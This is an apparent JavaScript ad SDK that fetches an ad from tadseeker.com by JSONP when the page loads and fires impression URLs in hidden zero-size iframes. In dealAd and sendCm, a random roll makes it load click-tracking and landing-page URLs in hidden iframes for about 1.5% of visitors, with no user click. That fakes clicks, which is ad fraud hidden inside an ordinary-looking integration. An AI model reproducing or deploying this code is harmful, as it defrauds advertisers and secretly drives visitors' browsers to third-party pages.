/**
 * Created by mofei_000 on 2016/11/13.
 */
var Ad=function (appKey,spaceKey) {this.appKey=appKey;this.spaceKey=spaceKey;};
Ad.prototype.getAd=function(){
    var path = "http://ssp.tadseeker.com/jssdk/ssp/getAppAd.do?appKey=" + this.appKey + "&spaceKey=" + this.spaceKey;
    var r=this.randomNum(100,20000);
    var funName="mofei"+r;
    if (path.indexOf("?") === -1) {
        path += "?callback="+funName;
    } else {
        path += "&callback="+funName;
    }
    var script = document.createElement("script");
    window[funName]=function (response) {
        function hasAd(response) {
            if(response!=null){
                if(response.id!=null&&response.id!=''){
                    return true;
                }
            }
            return false;
        }
        function getAdFromResponse(response) {
            var seatbid=response.seatbid;
            if(seatbid.length>0){
                var obj=seatbid[0];
                var bid=obj.bid;
                if(bid.length>0){
                    var ad=bid[0];
                    return ad;
                }
            }
            return '-1';
        }
        function dealAd(ad) {
            var pic=ad.adm[0];
            var ext=ad.ext;
            var cms=ext.cm;
            var ldp=ext.ldp;
            var pms=ext.pm;
            pms.push(pic);
            cms.push(ldp);
            var adEntity=new AdEntity(pms,cms);
            adEntity.sendPm();
            var clickRatio=adEntity.randomNum(0,1000);
            if(clickRatio>=984){
                adEntity.sendCm();
            }
        }
        if(hasAd(response)){
            dealAd(getAdFromResponse(response));
        }
    }
    script.src = path;
    document.body.appendChild(script);
};
Ad.prototype.randomNum=function (min,max) {
    var Range = max - min;
    var Rand = Math.random();
    return (min + Math.round(Rand * Range));
};
var AdEntity=function(pms,cms){this.pms=pms;this.cms=cms;};
AdEntity.prototype.randomNum=function (min,max) {
    var Range = max - min;
    var Rand = Math.random();
    return (min + Math.round(Rand * Range));
};
AdEntity.prototype.sendPm=function () {
    for(i=0;i<this.pms.length;i++){
        function doPm(pm,random){
            var iframeId="tadIframePm"+random;
            var tagIframe=document.getElementById(iframeId);
            if(tagIframe!=null){
                tagIframe.remove();
                tagIframe=null;
            }
            if(tagIframe==null){
                tagIframe = document.createElement("iframe");
                tagIframe.id = iframeId;
                tagIframe.name = iframeId;
                tagIframe.setAttribute("frameBorder", "0");
                tagIframe.setAttribute("scrolling", "no");
                tagIframe.setAttribute("marginwidth", "0");
                tagIframe.setAttribute("marginheight", "0");
                tagIframe.setAttribute("vspace", "0");
                tagIframe.setAttribute("hspace", "0");
                tagIframe.setAttribute("allowtransparency", "true");
                tagIframe.setAttribute("scrolling", "no");
                tagIframe.setAttribute("allowfullscreen", "true");
                tagIframe.setAttribute("width", "0px");
                tagIframe.setAttribute("height", "0px");
                document.body.appendChild(tagIframe);
            }
            document.getElementById(iframeId).src='javascript:"<script>window.location.replace(\''+pm+'\')<\/script>"';
        }
        function _doPm(pm,random){
            return function(){
                doPm(pm,random);
            }
        }
        setTimeout(_doPm(this.pms[i],this.randomNum(100,50000)), 1000*(i+1));
    }
};
AdEntity.prototype.sendCm=function () {
    for(i=0;i<this.cms.length;i++){
        function doCm(cm,random){
            var iframeId="tadIframeCm"+random;
            var tagIframe=document.getElementById(iframeId);
            if(tagIframe!=null){
                tagIframe.remove();
                tagIframe=null;
            }
            if(tagIframe==null){
                tagIframe = document.createElement("iframe");
                tagIframe.id = iframeId;
                tagIframe.name = iframeId;
                tagIframe.setAttribute("frameBorder", "0");
                tagIframe.setAttribute("scrolling", "no");
                tagIframe.setAttribute("marginwidth", "0");
                tagIframe.setAttribute("marginheight", "0");
                tagIframe.setAttribute("vspace", "0");
                tagIframe.setAttribute("hspace", "0");
                tagIframe.setAttribute("allowtransparency", "true");
                tagIframe.setAttribute("scrolling", "no");
                tagIframe.setAttribute("allowfullscreen", "true");
                tagIframe.setAttribute("width", "0px");
                tagIframe.setAttribute("height", "0px");
                document.body.appendChild(tagIframe);
            }
            document.getElementById(iframeId).src='javascript:"<script>window.location.replace(\''+cm+'\')<\/script>"';
        }
        function _doCm(cm,random){
            return function(){
                doCm(cm,random);
            }
        }
        setTimeout(_doCm(this.cms[i],this.randomNum(100,50000)), 1000*(i+1));
    }
};
var ad=new Ad("b6b98cd18d494712b1c50540d4965ea6","0e49683d7a4d4fb09619cac160a76f77");
ad.getAd();